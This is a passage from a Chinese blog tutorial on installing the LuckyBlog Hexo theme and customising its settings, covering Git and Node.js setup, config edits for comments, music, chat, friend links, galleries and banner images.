<a href="https://gitalk.github.io/">Gitalk</a>、<a href="https://imsun.github.io/gitment/">Gitment</a>、<a href="https://valine.js.org/">Valine</a> 和 <a href="https://disqus.com/">Disqus</a> 评论模块（推荐使用 <code>Valine</code>）</li><li><input checked="" disabled="" type="checkbox"> 集成了<a href="http://busuanzi.ibruce.info/">不蒜子统计</a>、谷歌分析（<code>Google Analytics</code>）和文章字数统计等功能</li><li><input checked="" disabled="" type="checkbox"> 支持在首页的音乐播放和视频播放功能</li><li><input checked="" disabled="" type="checkbox"> 修改了原主题以及基础主题中的一些<code>BUG</code></li><li><input checked="" disabled="" type="checkbox"> 加入图片懒加载功能，在根目录配置文件开启和关闭</li><li><input checked="" disabled="" type="checkbox"> 增加<code>留言板</code>功能   </li><li><input checked="" disabled="" type="checkbox"> 在关于板块,加入<code>简历</code>功能页</li><li><input checked="" disabled="" type="checkbox"> 增加完善<code>音乐</code>、<code>相册</code>、<code>视频</code>等功能页面 </li><li><input checked="" disabled="" type="checkbox"> 支持<code>emoji</code>表情，用<code>markdown emoji</code>语法书写直接生成对应的能<strong>跳跃</strong>的表情</li><li><input checked="" disabled="" type="checkbox"> 增加网站运行时间显示</li><li><input checked="" disabled="" type="checkbox"> 增加<code>live2d</code> 动漫人物模型</li><li><input checked="" disabled="" type="checkbox"> 整体替换Banner图片和文章特色图片</li><li><input checked="" disabled="" type="checkbox"> 增加实用的快捷导航栏功能</li><li><input checked="" disabled="" type="checkbox"> 修改了一些控件的参数以及部分样式</li><li><input checked="" disabled="" type="checkbox"> 优化了代码显示块的效果</li><li><input checked="" disabled="" type="checkbox"> 增加页面樱花飘落动效</li><li><input checked="" disabled="" type="checkbox"> 增加鼠标点击烟花爆炸动效</li><li><input checked="" disabled="" type="checkbox"> 增加页面雪花飘落动效</li><li><input checked="" disabled="" type="checkbox"> 增加博客白云背景效果</li><li><input checked="" disabled="" type="checkbox"> 增加天气接口控件</li><li><input checked="" disabled="" type="checkbox"> 加入鼠标点击文字特效</li><li><input checked="" disabled="" type="checkbox"> 增加<code>DaoVoice</code>在线聊天插件</li><li><input checked="" disabled="" type="checkbox"> 增加博客代码、图片压缩功能</li><li><input checked="" disabled="" type="checkbox"> 增加黑白天浏览模式功能</li><li><input checked="" disabled="" type="checkbox"> 增加仿<code>Windows</code>功能</li><li><input checked="" disabled="" type="checkbox"> 增加站点统计功能</li><li><input checked="" disabled="" type="checkbox"> 增加留言版一言功能</li><li><input checked="" disabled="" type="checkbox"> 其他</li></ul><h3 id="0x02-LuckyBlog-安装"><a href="#0x02-LuckyBlog-安装" class="headerlink" title="0x02 LuckyBlog 安装"></a>0x02 LuckyBlog 安装</h3><h4 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1. 安装Git"></a>1. 安装Git</h4><p><code>Git</code>是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。<code>Git</code>的作用是将本地的网页文件传到<code>github</code>上。</p><ul><li>Git<a href="https://git-scm.com/download">下载地址</a></li><li>Git<a href="https://www.liaoxuefeng.com/wiki/896043488029600">教程</a></li></ul><p><strong>windows：</strong> 到git官网上下载.exe文件,Download git,安装选项全部默认即可。</p><h4 id="2-安装node-js"><a href="#2-安装node-js" class="headerlink" title="2. 安装node.js"></a>2. 安装node.js</h4><p><code>Hexo</code>是基于<code>node.js</code>编写的，所以需要安装一下<code>node.js</code>和里面的<code>npm</code>工具。</p><p><strong>windows：</strong> 到<a href="http://nodejs.cn/download/">Node.js官网</a>下载<code>.exe</code>文件，安装选项全部默认。安装好之后，按<code>Win+R</code>打开cmd命令提示符，输入<code>node -v</code>和<code>npm -v</code>，若出现版本号，则说明安装成功。</p><h4 id="3-添加npm国内源"><a href="#3-添加npm国内源" class="headerlink" title="3. 添加npm国内源"></a>3. 添加npm国内源</h4><p>使用阿里的国内镜像进行加速下载</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> config <span class="token builtin class-name">set</span> registry https://registry.npm.taobao.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-安装Hexo"><a href="#4-安装Hexo" class="headerlink" title="4. 安装Hexo"></a>4. 安装Hexo</h4><p>前面<code>git</code>和<code>nodejs</code>安装好后，就可以安装<code>hexo</code>了，你可以先创建一个文件夹<code>MyBlog</code>，用来存放自己的博客文件，然后<code>cd</code>到这个文件夹下（或者在这个文件夹下直接鼠标右键<code>git bash</code>打开）。</p><p>比如我的博客文件都存放在<code>C:\MyBlog</code>目录下。</p><p>在该目录下右键点击<code>Git Bash Here</code>，打开<code>git</code>的控制台窗口，以后我们所有的操作都在<code>git</code>控制台进行，就不用<code>Windows</code>自带的<code>cmd</code>了。</p><p>定位到该目录下，输入<code>npm install -g hexo-cli</code>安装<code>Hexo</code>。可能会有几个报错，不用理会。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> -g hexo-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完后输入<code>hexo -v</code>验证是否安装成功。</p><p>接下来初始化一下<code>hexo</code>,即初始化我们的博客网站。例如我的在<code>C:\MyBlog</code>文件夹下的命令行中，输入<code>hexo init</code>初始化文件夹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>新建完成后，指定文件夹<code>MyBlog</code>目录下有：</p><ul><li><code>node_modules</code>: 依赖包</li><li><code>public</code>：存放生成的页面</li><li><code>scaffolds</code>：生成文章的一些模板</li><li><code>source</code>：用来存放你的文章</li><li><code>themes</code>：主题**</li><li><code>_config.yml</code>: 博客的配置文件**</li></ul><p>到此为止，本地的Hexo基础环境搭建完成了。</p><h4 id="5-安装LuckyBlog"><a href="#5-安装LuckyBlog" class="headerlink" title="5. 安装LuckyBlog"></a>5. 安装LuckyBlog</h4><p>下载源代码到本地文件下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/LuckyZmj/LuckyBlog.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将下载好的<code>LuckyBlog</code>全部复制到<code>MyBlog</code>目录下，如果复制过程中出现重复文件，点击替换。</p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20210518202657.png"></p><p>最后使用 <code>npm i</code> 或者 <code>npm install</code> 安装依赖环境包即可。</p><blockquote><p>如果安装依赖环境出错，可以参考<a href="https://blog.csdn.net/Seven71111/article/details/103364738">这篇文章</a>。</p></blockquote><p>最后执行 <code>hexo clean</code> 和 <code>hexo s -g</code> 启动Hexo本地预览，即可看到效果。</p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20210518204521.JPG"></p><p>到此为止LuckyBlog安装完成，接下来就是个性化设置了。</p><h3 id="0x03-LuckyBlog-个性化"><a href="#0x03-LuckyBlog-个性化" class="headerlink" title="0x03 LuckyBlog 个性化"></a>0x03 LuckyBlog 个性化</h3><blockquote><p>注意！注意！注意！在阅读以下博客个性化之前，最好希望大家有Hexo博客配置主题的基础。如果是完全小白，建议去网上搜索学习相关Hexo搭建博客的过程，另外去B站上也有很多视频教程。博客个性化是需要大家有耐心的，因为每个人的操作不同，在配置过程中可能会遇到一些不可预期的问题，希望大家可以克服这些困难，如有需要帮助，也可以私信博主帮助大家解决问题。</p></blockquote><h4 id="1-修改部署平台"><a href="#1-修改部署平台" class="headerlink" title="1. 修改部署平台"></a>1. 修改部署平台</h4><p>编辑根目录下的配置文件<code>MyBlog/_config.yml</code>，找到如下内容并修改</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">deploy:- type: <span class="token function">git</span>  repo: git@github.com:LuckyZmj/LuckyZmj.github.io.git <span class="token comment"># 替换为你的部署平台地址</span>  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-修改网站信息"><a href="#2-修改网站信息" class="headerlink" title="2. 修改网站信息"></a>2. 修改网站信息</h4><p>编辑根目录下的配置文件<code>MyBlog/_config.yml</code>，找到如下内容并修改</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Site</span>title: Luckeysubtitle: <span class="token string">'Luckeyの博客'</span>  description: <span class="token string">'本科 | 计算机科学与技术 | 网络安全'</span>keywords: <span class="token string">'luckyzmj 计算机 网络安全 渗透测试'</span>  <span class="token comment"># 博客网站关键词</span>author: Luckey   <span class="token comment"># 博主名称</span>language: zh-CNtimezone: <span class="token string">''</span><span class="token comment"># URL</span><span class="token comment">## If your site is put in a subdirectory, set url as 'http://example.com/child' and root as '/child/'</span>url: http://www.luckyzmj.cn   <span class="token comment"># 更改为你的博客地址</span>root: /<span class="token comment"># permalink: :year/:month/:day/:title/</span>permalink: posts/:abbrlink.html  <span class="token comment"># p 是自定义的前缀</span>abbrlink:    alg: crc32   <span class="token comment">#算法： crc16(default) and crc32</span>    rep: hex     <span class="token comment">#进制： dec(default) and hex</span>permalink_defaults:pretty_urls:  trailing_index: <span class="token boolean">true</span> <span class="token comment"># Set to false to remove trailing 'index.html' from permalinks</span>  trailing_html: <span class="token boolean">true</span> <span class="token comment"># Set to false to remove trailing '.html' from permalinks</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-修改博客头像"><a href="#3-修改博客头像" class="headerlink" title="3. 修改博客头像"></a>3. 修改博客头像</h4><p>编辑主题目录下的配置文件<code>MyBlog/themes/matery/_config.yml</code>，找到如下内容并修改</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Configure website favicon and LOGO</span><span class="token comment"># 将以下改为自己的头像链接即可</span>favicon: https://s1.ax1x.com/2020/05/17/YR20js.jpglogo: https://s1.ax1x.com/2020/05/17/YRWsYT.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-修改留言板简介"><a href="#4-修改留言板简介" class="headerlink" title="4. 修改留言板简介"></a>4. 修改留言板简介</h4><p>演示效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20210518204949.png"></p><p>编辑 <code>/MyBlog/contact/index.md</code>，修改你想要内容即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">---title: contactdate: <span class="token number">2019</span>-10-25 00:00:00type: <span class="token string">"contact"</span>layout: <span class="token string">"contact"</span>---<span class="token comment">## 畅所欲言</span>---在这里可以留下你的足迹，欢迎在下方留言，欢迎交换友链，一起交流学习！<span class="token comment">## 友链</span>---Lucky_Meの友链信息博客名称: Lucky_Meの博客博客网址: http://luckyzmj.cn博客头像: https://s1.ax1x.com/2020/05/17/YRWsYT.png博客介绍: 知识面决定攻击面，知识链决定攻击深度！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="5-修改音乐列表"><a href="#5-修改音乐列表" class="headerlink" title="5. 修改音乐列表"></a>5. 修改音乐列表</h4><p>想要修改自己喜欢的音乐之前，需要先获取音乐列表的id。</p><p>以QQ音乐为例：先登录<a href="https://y.qq.com/">QQ音乐网页版</a>，点击打开自己喜欢的音乐列表，在网页的URL处包含了音乐列表的id，如下图所示</p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200916213029.png"></p><p>编辑主题目录下的配置文件<code>MyBlog/themes/matery/_config.yml</code>，找到如下内容并修改</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 默认是博主的QQ音乐的id，大家可以改为自己音乐喜欢列表的id</span><span class="token comment"># 更新完id，就可以同步加载自己喜欢的列表音乐了</span><span class="token comment"># Whether to display the musics.</span><span class="token comment"># 是否在首页显示音乐.</span>music:  enable: <span class="token boolean">true</span>  title: <span class="token comment">#非吸底模式有效</span>    enable: <span class="token boolean">true</span>    show: 听听音乐  autoHide: <span class="token boolean">true</span>    <span class="token comment"># hide automaticaly</span>  server: tencent   <span class="token comment">#require  music platform: netease, tencent, kugou, xiami, baidu</span>  type: playlist    <span class="token comment">#require song, playlist, album, search, artist</span>  id: <span class="token number">1776127550</span>     <span class="token comment">#require song id / playlist id / album id / search keyword</span>  fixed: <span class="token boolean">true</span>       <span class="token comment"># 开启吸底模式</span>  autoplay: <span class="token boolean">false</span>   <span class="token comment"># 是否自动播放</span>  theme: <span class="token string">'#42b983'</span>  loop: <span class="token string">'all'</span>       <span class="token comment"># 音频循环播放, 可选值: 'all', 'one', 'none'</span>  order: <span class="token string">'random'</span>   <span class="token comment"># 音频循环顺序, 可选值: 'list', 'random'</span>  preload: <span class="token string">'auto'</span>   <span class="token comment"># 预加载，可选值: 'none', 'metadata', 'auto'</span>  volume: <span class="token number">0.7</span>       <span class="token comment"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span>  listFolded: <span class="token boolean">true</span>  <span class="token comment"># 列表默认折叠</span>  hideLrc: <span class="token boolean">true</span>     <span class="token comment"># 隐藏歌词</span><span class="token comment"># Whether to display the musics.</span><span class="token comment"># 单独的音乐页面.</span>musics:  enable: <span class="token boolean">true</span>  title:          <span class="token comment">#非吸底模式有效</span>    enable: <span class="token boolean">true</span>    show: 听听音乐  server: tencent   <span class="token comment">#require music platform: netease, tencent, kugou, xiami, baidu</span>  type: playlist    <span class="token comment">#require song, playlist, album, search, artist</span>  id: <span class="token number">1776127550</span>     <span class="token comment">#require song id / playlist id / album id / search keyword</span>  fixed: <span class="token boolean">false</span>      <span class="token comment"># 开启吸底模式</span>  autoplay: <span class="token boolean">true</span>   <span class="token comment"># 是否自动播放</span>  theme: <span class="token string">'#42b983'</span>  loop: <span class="token string">'all'</span>       <span class="token comment"># 音频循环播放, 可选值: 'all', 'one', 'none'</span>  order: <span class="token string">'random'</span>   <span class="token comment"># 音频循环顺序, 可选值: 'list', 'random'</span>  preload: <span class="token string">'auto'</span>   <span class="token comment"># 预加载，可选值: 'none', 'metadata', 'auto'</span>  volume: <span class="token number">0.7</span>       <span class="token comment"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span>  listFolded: <span class="token boolean">false</span>  <span class="token comment"># 列表默认折叠</span>  listMaxHeight: <span class="token string">"525px"</span> <span class="token comment">#列表最大高度</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-绑定-Valine-评论"><a href="#6-绑定-Valine-评论" class="headerlink" title="6. 绑定 Valine 评论"></a>6. 绑定 Valine 评论</h4><p>编辑主题目录下的配置文件<code>MyBlog/themes/matery/_config.yml</code>，找到如下内容并修改</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Valine 评论模块的配置，默认为不激活，如要使用，就请激活该配置项，并设置 appId 和 appKey.</span>valine:  enable: <span class="token boolean">true</span>  appId: Ucrxxxxxxxxxxxxxxxx-xxxxsz  <span class="token comment"># 自行注册valine获取</span>  appKey: zPsLxxxxxxxxxxxxxxerLmd    <span class="token comment"># 自行注册valine获取</span>  notify: <span class="token boolean">true</span>  verify: <span class="token boolean">true</span>  visitor: <span class="token boolean">true</span>  avatar: <span class="token string">'monsterid'</span> <span class="token comment"># Gravatar style : mm/identicon/monsterid/wavatar/retro/hide</span>  pageSize: <span class="token number">10</span>  placeholder: <span class="token string">'留下你的足迹..'</span> <span class="token comment"># Comment Box placeholder</span>  background: /medias/comment_bg.png  count: <span class="token boolean">true</span>  enableQQ: <span class="token number">16463223</span>  <span class="token comment"># 改为自己的QQ号</span>  recordIP: <span class="token boolean">true</span>  requiredFields:     - nick    - mail  guest_info:     - nick    - mail    - <span class="token function">link</span>  master:     - 46606772953bed0812789d6dc955614e  <span class="token comment"># md5加密后的博主邮箱</span>  metaPlaceholder:  <span class="token comment"># 输入框的背景文字</span>    nick: 昵称/QQ号<span class="token punctuation">(</span>必填<span class="token punctuation">)</span>    mail: 邮箱<span class="token punctuation">(</span>必填<span class="token punctuation">)</span>    link: 网址<span class="token punctuation">(</span>https://<span class="token punctuation">)</span>  lang: zh-CN  tagMeta: <span class="token comment"># The String Array of Words to show Flag.[Just Only xCss Style mode]</span>    - 博主    - 小伙伴    - 访客  friends: <span class="token comment"># The MD5 String Array of friends Email to show friends Flag.[Just Only xCss Style mode]</span>    - cb3e577ff029d6073400d5557effd41f       -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="7-绑定-DaoVoice-在线聊天"><a href="#7-绑定-DaoVoice-在线聊天" class="headerlink" title="7. 绑定 DaoVoice 在线聊天"></a>7. 绑定 DaoVoice 在线聊天</h4><p>编辑主题目录下的配置文件<code>MyBlog/themes/matery/_config.yml</code>，找到如下内容并修改</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">daovoice:  enable: <span class="token boolean">true</span>  app_id: 4xxxxxxxe   <span class="token comment">#DaoVoice中的app_id</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="8-快捷导航页面个性化"><a href="#8-快捷导航页面个性化" class="headerlink" title="8. 快捷导航页面个性化"></a>8. 快捷导航页面个性化</h4><p>编辑文件<code>MyBlog/source/tools/index.html</code>，以下简单标记出几处，还有其他涉及到博客信息的内容都需要改为你自己的博客信息即可。</p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20200916235833.png"></p><h4 id="9-添加友情链接"><a href="#9-添加友情链接" class="headerlink" title="9. 添加友情链接"></a>9. 添加友情链接</h4><p>编辑文件<code>MyBlog/suorce/_data/friends.json</code>，按如下格式添加友情</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>    <span class="token punctuation">{</span>        <span class="token string">"avatar"</span><span class="token builtin class-name">:</span> <span class="token string">"https://s1.ax1x.com/2020/05/17/YRWsYT.png"</span>,        <span class="token string">"name"</span><span class="token builtin class-name">:</span> <span class="token string">"Luckey"</span>,        <span class="token string">"introduction"</span><span class="token builtin class-name">:</span> <span class="token string">"越努力，越幸运"</span>,        <span class="token string">"url"</span><span class="token builtin class-name">:</span> <span class="token string">"http://www.luckyzmj.cn"</span>,        <span class="token string">"title"</span><span class="token builtin class-name">:</span> <span class="token string">"访问主页"</span>    <span class="token punctuation">}</span>,<span class="token punctuation">{</span>      <span class="token string">"avatar"</span><span class="token builtin class-name">:</span> <span class="token string">"https://sunhwee.com/hwsun.jpg"</span>,      <span class="token string">"name"</span><span class="token builtin class-name">:</span> <span class="token string">"洪卫の博客"</span>,      <span class="token string">"introduction"</span><span class="token builtin class-name">:</span> <span class="token string">"UESTC CVer"</span>,      <span class="token string">"url"</span><span class="token builtin class-name">:</span> <span class="token string">"http://sunhwee.com"</span>,      <span class="token string">"title"</span><span class="token builtin class-name">:</span> <span class="token string">"访问主页"</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="10-添加相册"><a href="#10-添加相册" class="headerlink" title="10. 添加相册"></a>10. 添加相册</h4><p>比如你的图片上传图床后，链接地址如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/璀璨星空/01.jpghttps://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/璀璨星空/02.jpghttps://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/动漫风景/01.jpghttps://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/动漫风景/02.jpg<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先提取出图片链接公共的部分，作为图床地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再提取图片地址中不同的部分，作为图片地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">璀璨星空/01.jpg璀璨星空/02.jpg动漫风景/01.jpg动漫风景/03.jpg<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>具体怎么分割根据你自己图床的链接格式而定，以上为我的github图床格式为例。</p></blockquote><p>将相册图床的地址改为你自己的图床地址，需要更改两处文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 例如我的图床地址为：</span>https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>themes/matery/layout/galleries.ejs</p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20201008183019.png"></p><p>themes/matery/layout/gallerie.ejs</p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20201008183219.png"></p><p>为每个相册添加链接地址，在根目录/source/List/galleries/下新建 相册名称 文件夹，并在该文件夹下新建 <code>index.md</code> </p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/posts/20201008183808.png"></p><p>最后，在根目录/source/_data/galleries.json中添加图片链接，格式如下,</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>  <span class="token punctuation">{</span>    <span class="token string">"name"</span><span class="token builtin class-name">:</span> <span class="token string">"璀璨星空"</span>,    <span class="token string">"cover"</span><span class="token builtin class-name">:</span> <span class="token string">"璀璨星空/01.jpg"</span>,    <span class="token string">"description"</span><span class="token builtin class-name">:</span> <span class="token string">"璀璨星空"</span>,    <span class="token string">"photos"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>      <span class="token string">"璀璨星空/01.jpg"</span>,      <span class="token string">"璀璨星空/02.jpg"</span>,      <span class="token string">"璀璨星空/03.jpg"</span>,      <span class="token string">"璀璨星空/04.jpg"</span>,      <span class="token string">"璀璨星空/05.jpg"</span>,      <span class="token string">"璀璨星空/06.jpg"</span>,      <span class="token string">"璀璨星空/07.jpg"</span>,      <span class="token string">"璀璨星空/08.jpg"</span>,      <span class="token string">"璀璨星空/09.jpg"</span>,      <span class="token string">"璀璨星空/10.jpg"</span>,      <span class="token string">"璀璨星空/11.jpg"</span>,      <span class="token string">"璀璨星空/12.jpg"</span>,      <span class="token string">"璀璨星空/13.jpg"</span>,      <span class="token string">"璀璨星空/14.jpg"</span>,      <span class="token string">"璀璨星空/15.jpg"</span>,      <span class="token string">"璀璨星空/16.jpg"</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span>,  <span class="token punctuation">{</span>    <span class="token string">"name"</span><span class="token builtin class-name">:</span> <span class="token string">"动漫风景"</span>,    <span class="token string">"cover"</span><span class="token builtin class-name">:</span> <span class="token string">"动漫风景/01.jpg"</span>,    <span class="token string">"description"</span><span class="token builtin class-name">:</span> <span class="token string">"动漫风景"</span>,    <span class="token string">"photos"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>      <span class="token string">"动漫风景/01.jpg"</span>,      <span class="token string">"动漫风景/02.jpg"</span>,      <span class="token string">"动漫风景/03.jpg"</span>,      <span class="token string">"动漫风景/04.jpg"</span>,      <span class="token string">"动漫风景/05.jpg"</span>,      <span class="token string">"动漫风景/06.jpg"</span>,      <span class="token string">"动漫风景/07.jpg"</span>,      <span class="token string">"动漫风景/08.jpg"</span>,      <span class="token string">"动漫风景/09.jpg"</span>,      <span class="token string">"动漫风景/10.jpg"</span>,      <span class="token string">"动漫风景/11.jpg"</span>,      <span class="token string">"动漫风景/12.jpg"</span>,      <span class="token string">"动漫风景/13.jpg"</span>,      <span class="token string">"动漫风景/14.jpg"</span>,      <span class="token string">"动漫风景/15.jpg"</span>,      <span class="token string">"动漫风景/16.jpg"</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="11-站点统计功能"><a href="#11-站点统计功能" class="headerlink" title="11. 站点统计功能"></a>11. 站点统计功能</h4><p>站点统计的数据来源于<a href="https://tongji.baidu.com/web/welcome/login">百度统计</a>,当你的网站被百度收录后就会在百度统计中出现数据，具体效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20210518211242.png"></p><p>由于博客的统计页面数据不能直接从百度站点中调用，因此需要自行从百度站点中将相应数据填入博客站点统计页面的源代码文件中，个人建议每隔一个月手动更新一次数据。</p><p>打开<code>MyBlog\themes\matery\layout\census.ejs</code>文件，将百度统计中的数据填入源代码中，修改代码如下：</p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20210518210629.png"></p><h4 id="11-仿Windows个性化"><a href="#11-仿Windows个性化" class="headerlink" title="11. 仿Windows个性化"></a>11. 仿Windows个性化</h4><p>仿Windows页面是采用<a href="https://ylui.yuri2.cn/">YLUI</a>实现的，YLUI提供了社区版本供大家学习使用，具体效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/posts/20210518211817.png"></p><p>大家可以查看YLUI官方的<a href="https://github.com/yuri2peter/ylui/tree/master/documents">开发文档</a>进行开发，有不懂的可以加官方的QQ群：<code>191372634</code> 进行讨论。</p><h4 id="12-博客动漫风格背景图"><a href="#12-博客动漫风格背景图" class="headerlink" title="12. 博客动漫风格背景图"></a>12. 博客动漫风格背景图</h4><p>因为在上一个LuckyBlog版本发布的网站风格是偏向动漫风格的，如果大家喜欢动漫风格，只需要替换以下配置即可。</p><p><strong>博客每日轮播图：</strong> 以下链接图片全部下载保存到<code>MyBlog\themes\matery\source\medias\banner</code>中，以0~7.jpg的文件名格式命名即可。</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">https://cdn.jsdelivr.net/gh/LuckyZmj/LuckyBlog@master/themes/matery/source/medias/banner/0.jpghttps://cdn.jsdelivr.net/gh/LuckyZmj/LuckyBlog@master/themes/matery/source/medias/banner/1.jpghttps://cdn.jsdelivr.net/gh/LuckyZmj/LuckyBlog@master/themes/matery/source/medias/banner/2.jpghttps://cdn.jsdelivr.net/gh/LuckyZmj/LuckyBlog@master/themes/matery/source/medias/banner/3.jpghttps://cdn.jsdelivr.net/gh/LuckyZmj/LuckyBlog@master/themes/matery/source/medias/banner/4.jpghttps://cdn.jsdelivr.net/gh/LuckyZmj/LuckyBlog@master/themes/matery/source/medias/banner/5.jpghttps://cdn.jsdelivr.net/gh/LuckyZmj/LuckyBlog@master/themes/matery/source/medias/banner/6.jpghttps://cdn.jsdelivr.net/gh/LuckyZmj/LuckyBlog@master/themes/matery/source/medias/banner/7.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>无文章特色背景图：</strong> 打开主题配置文件<code>MyBlog\themes\matery\_config.yml</code>，修改替换如下代码即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># The post featured images that needs to be displayed when there is no image.</span><span class="token comment"># 无文章特色图片时需要显示的文章特色图片.</span>featureImages: - https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/01.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/02.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/04.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/06.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/07.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/10.jpg- https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed@master/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/11.jpg- 